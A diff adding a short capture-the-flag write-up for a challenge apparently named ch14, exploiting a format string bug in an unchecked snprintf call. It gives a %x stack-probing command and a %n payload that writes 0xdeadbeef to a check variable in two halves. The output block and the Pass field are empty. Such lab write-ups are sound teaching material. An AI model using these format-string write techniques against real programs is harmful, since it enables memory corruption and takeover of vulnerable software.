@@ -44,9 +44,23 @@ int main( int argc, char ** argv )
         }
 }
 ```
+Our aim is overwriting the **check**'s value. We leverage a vulnerability in 
+`snprintf( fmt, sizeof(fmt), argv[1] );` 
+with no format specifier. Examine the stack and find a way to change that value.
 
 ### Solution:
+Let's try looking into the stack by usual payload
+`./ch14 $(python -c "print 'AAAA' + '%x'")`
+Output:
+```
+```
 
+Exploit:
+"0xdeadbeef"  is too large (over 32 bits), we have to divide **check** into **0xdead (57005)** and **0xbeef (48879)**.
+7 times %8x to pull esp in front of the check.
+%48811c%n output (0xbeef)
+%8126c%n(0xdead)
+in other words, payload is (beef address) + (dummy) + (dead address) + %8x*7 + (%48811c%n%8126c%n)
 Pass: 
 
 
